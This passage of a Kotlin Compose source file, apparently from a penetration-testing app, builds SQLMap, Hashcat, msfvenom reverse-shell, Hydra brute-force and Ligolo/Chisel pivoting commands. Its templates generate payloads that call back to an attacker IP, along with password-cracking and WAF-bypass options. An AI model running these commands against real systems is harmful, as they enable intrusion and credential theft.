        ToggleOption(label = "--random-agent (Rastgele User-Agent)", checked = randomAgent, onCheckedChange = { randomAgent = it })
        ToggleOption(label = "--tamper=space2comment (WAF Atlama)", checked = useTamper, onCheckedChange = { useTamper = it })

        // Assemble SQLMap command
        val cmdParts = mutableListOf("sqlmap", "-u", "\"$url\"")
        if (param.isNotBlank()) cmdParts.addAll(listOf("-p", param.trim()))
        when (levelRisk) {
            "high" -> cmdParts.addAll(listOf("--level=3", "--risk=3"))
            "extreme" -> cmdParts.addAll(listOf("--level=5", "--risk=3"))
            else -> {}
        }
        cmdParts.add(action)
        if (batchMode) cmdParts.add("--batch")
        if (randomAgent) cmdParts.add("--random-agent")
        if (useTamper) cmdParts.add("--tamper=space2comment")

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 5. HASHCAT BUILDER
// -------------------------------------------------------------
@Composable
fun HashcatBuilder(language: AppLanguage) {
    var hashFile by remember { mutableStateOf("hashes.txt") }
    var hashType by remember { mutableStateOf("1000") } // 1000: NTLM, 0: MD5, 1800: sha512, 5600: NetNTLMv2
    var attackMode by remember { mutableStateOf("0") } // 0: Wordlist, 3: Mask
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var mask by remember { mutableStateOf("?a?a?a?a?a?a?a?a") }
    var useRule by remember { mutableStateOf(false) }
    var rulePath by remember { mutableStateOf("/usr/share/hashcat/rules/best64.rule") }
    var optimizeKernels by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(
            value = hashFile,
            onValueChange = { hashFile = it },
            label = { Text("Hash Dosyası / Hash Metni") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Hash Types
        Text(
            text = if (language == AppLanguage.TR) "HASH TİPİ (-m)" else "HASH TYPE (-m)",
            style = MaterialTheme.typography.bodySmall,
            color = TerminalCyan
        )
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "1000" to "NTLM",
                "0" to "MD5",
                "100" to "SHA1",
                "1400" to "SHA256",
                "1800" to "sha512crypt (Linux)",
                "5600" to "NetNTLMv2",
                "13100" to "Kerberoasting (TGS)",
                "18200" to "AS-REP Roasting",
                "22000" to "WPA-PBKDF2 (WiFi)",
                "3200" to "bcrypt"
            ).forEach { (m, lbl) ->
                val selected = hashType == m
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { hashType = m }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = "$m ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Attack Mode
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("0" to "-a 0 (Wordlist / Sözlük)", "3" to "-a 3 (Mask / Kaba Kuvvet)").forEach { (mode, lbl) ->
                val selected = attackMode == mode
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) TerminalCyan.copy(alpha = 0.15f) else SurfaceDark)
                        .border(1.dp, if (selected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { attackMode = mode }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (selected) TerminalCyan else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        if (attackMode == "0") {
            OutlinedTextField(
                value = wordlist,
                onValueChange = { wordlist = it },
                label = { Text("Wordlist Yolu") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
            ToggleOption(label = "-r Kural Ekle (best64.rule)", checked = useRule, onCheckedChange = { useRule = it })
        } else {
            OutlinedTextField(
                value = mask,
                onValueChange = { mask = it },
                label = { Text("Mask (?u?l?d?s - Büyük/Küçük/Rakam/Sembol)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        }

        ToggleOption(label = "-O (GPU Optimize Kernel & Hızlandırma)", checked = optimizeKernels, onCheckedChange = { optimizeKernels = it })

        // Assemble Hashcat command
        val cmdParts = mutableListOf("hashcat", "-m", hashType, "-a", attackMode)
        if (optimizeKernels) cmdParts.add("-O")
        cmdParts.add(hashFile.trim())
        if (attackMode == "0") {
            cmdParts.add(wordlist.trim())
            if (useRule) cmdParts.addAll(listOf("-r", rulePath.trim()))
        } else {
            cmdParts.add(mask.trim())
        }

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 6. MSFVENOM BUILDER
// -------------------------------------------------------------
@Composable
fun MsfvenomBuilder(language: AppLanguage) {
    var platform by remember { mutableStateOf("windows_x64") }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var lport by remember { mutableStateOf("4444") }
    var format by remember { mutableStateOf("exe") }
    var outputFile by remember { mutableStateOf("payload.exe") }
    var enableEncoder by remember { mutableStateOf(false) }

    Column {
        // Platform Selector
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "windows_x64" to "Windows x64 (.exe)",
                "windows_x86" to "Windows x86 (.exe)",
                "linux_x64" to "Linux x64 (.elf)",
                "php" to "PHP (.php)",
                "aspx" to "ASPX (.aspx)",
                "android" to "Android (.apk)",
                "war" to "Java WAR (.war)"
            ).forEach { (plat, lbl) ->
                val selected = platform == plat
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) ExploitRed.copy(alpha = 0.2f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) ExploitRed else BorderDark, RoundedCornerShape(6.dp))
                        .clickable {
                            platform = plat
                            when (plat) {
                                "windows_x64" -> { format = "exe"; outputFile = "shell64.exe" }
                                "windows_x86" -> { format = "exe"; outputFile = "shell32.exe" }
                                "linux_x64" -> { format = "elf"; outputFile = "shell.elf" }
                                "php" -> { format = "raw"; outputFile = "shell.php" }
                                "aspx" -> { format = "aspx"; outputFile = "shell.aspx" }
                                "android" -> { format = "apk"; outputFile = "shell.apk" }
                                "war" -> { format = "war"; outputFile = "shell.war" }
                            }
                        }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) ExploitRed else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = lhost,
                onValueChange = { lhost = it },
                label = { Text("LHOST (IP)") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
            OutlinedTextField(
                value = lport,
                onValueChange = { lport = it },
                label = { Text("LPORT") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(8.dp))

        // Full payload name determination
        val fullPayload = when (platform) {
            "windows_x64" -> "windows/x64/meterpreter/reverse_tcp"
            "windows_x86" -> "windows/meterpreter/reverse_tcp"
            "linux_x64" -> "linux/x64/shell_reverse_tcp"
            "php" -> "php/reverse_php"
            "aspx" -> "windows/shell_reverse_tcp"
            "android" -> "android/meterpreter/reverse_tcp"
            "war" -> "java/jsp_shell_reverse_tcp"
            else -> "windows/x64/meterpreter/reverse_tcp"
        }

        ToggleOption(label = "Encoder Kullan (-e x86/shikata_ga_nai -i 3)", checked = enableEncoder, onCheckedChange = { enableEncoder = it })

        // Assemble Msfvenom command
        val cmdParts = mutableListOf("msfvenom", "-p", fullPayload, "LHOST=$lhost", "LPORT=$lport", "-f", format)
        if (enableEncoder) cmdParts.addAll(listOf("-e", "x86/shikata_ga_nai", "-i", "3"))
        cmdParts.addAll(listOf("-o", outputFile))

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 7. HYDRA BUILDER
// -------------------------------------------------------------
@Composable
fun HydraBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.10") }
    var service by remember { mutableStateOf("ssh") }
    var userMode by remember { mutableStateOf("single") } // single, list
    var userValue by remember { mutableStateOf("admin") }
    var passMode by remember { mutableStateOf("list") } // single, list
    var passValue by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var threads by remember { mutableStateOf("16") }
    var exitOnFirst by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef IP veya Hostname") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(8.dp))

        // Services
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("ssh", "ftp", "rdp", "smb", "mysql", "telnet", "http-get").forEach { srv ->
                val selected = service == srv
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { service = srv }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = srv.uppercase(), fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = userValue,
            onValueChange = { userValue = it },
            label = { Text(if (userMode == "single") "Kullanıcı Adı (-l)" else "Kullanıcı Listesi (-L)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(6.dp))

        OutlinedTextField(
            value = passValue,
            onValueChange = { passValue = it },
            label = { Text(if (passMode == "single") "Parola (-p)" else "Parola Listesi (-P)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(
                focusedBorderColor = CyberGreen,
                unfocusedBorderColor = BorderDark,
                focusedTextColor = TextPrimary,
                unfocusedTextColor = TextPrimary
            ),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(6.dp))

        ToggleOption(label = "-f (İlk Başarılı Girişte Dur)", checked = exitOnFirst, onCheckedChange = { exitOnFirst = it })

        // Assemble Hydra command
        val cmdParts = mutableListOf("hydra")
        if (userMode == "single") cmdParts.addAll(listOf("-l", userValue.trim())) else cmdParts.addAll(listOf("-L", userValue.trim()))
        if (passMode == "single") cmdParts.addAll(listOf("-p", passValue.trim())) else cmdParts.addAll(listOf("-P", passValue.trim()))
        if (exitOnFirst) cmdParts.add("-f")
        if (threads.isNotBlank()) cmdParts.addAll(listOf("-t", threads.trim()))
        cmdParts.addAll(listOf("-V", target.trim(), service))

        GeneratedCommandCard(
            command = cmdParts.joinToString(" "),
            language = language
        )
    }
}

// -------------------------------------------------------------
// 8. LIGOLO & CHISEL PIVOTING BUILDER
// -------------------------------------------------------------
@Composable
fun LigoloChiselBuilder(language: AppLanguage) {
    var toolMode by remember { mutableStateOf("ligolo_proxy") }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var lport by remember { mutableStateOf("11601") }
    var socksPort by remember { mutableStateOf("1080") }

    Column {
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "ligolo_proxy" to "Ligolo Proxy (Saldırgan)",
                "ligolo_agent" to "Ligolo Agent (Kurban)",
                "chisel_server" to "Chisel Server",
                "chisel_client" to "Chisel Client (SOCKS5)"
            ).forEach { (m, lbl) ->
                val selected = toolMode == m
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (selected) AccentBlue.copy(alpha = 0.2f) else SurfaceVariantDark)
                        .border(1.dp, if (selected) AccentBlue else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { toolMode = m }
                        .padding(horizontal = 8.dp, vertical = 5.dp)
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) AccentBlue else TextPrimary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = lhost,
                onValueChange = { lhost = it },
                label = { Text("LHOST / Sunucu IP") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
            OutlinedTextField(
                value = lport,
                onValueChange = { lport = it },
                label = { Text("LPORT") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                ),
                singleLine = true
            )
        }

        val generated = when (toolMode) {
            "ligolo_proxy" -> "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:$lport"
            "ligolo_agent" -> "./agent -connect $lhost:$lport -ignore-cert"
            "chisel_server" -> "./chisel server -p $lport --reverse"
            "chisel_client" -> "./chisel client $lhost:$lport R:$socksPort:socks"
            else -> "./agent -connect $lhost:$lport -ignore-cert"
        }

        GeneratedCommandCard(
            command = generated,
            language = language
        )
    }
}

// -------------------------------------------------------------
// REUSABLE TOGGLE COMPONENT
// -------------------------------------------------------------
@Composable
fun ToggleOption(
    label: String,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .clickable { onCheckedChange(!checked) }
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Text(
            text = label,
            fontSize = 11.5.sp,
            fontFamily = FontFamily.Monospace,
            color = if (checked) TextPrimary else TextSecondary,
            modifier = Modifier.weight(1f)
        )
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = BackgroundDark,
                checkedTrackColor = CyberGreen,
                uncheckedThumbColor = TextMuted,
                uncheckedTrackColor = SurfaceVariantDark
            )
        )
    }
}
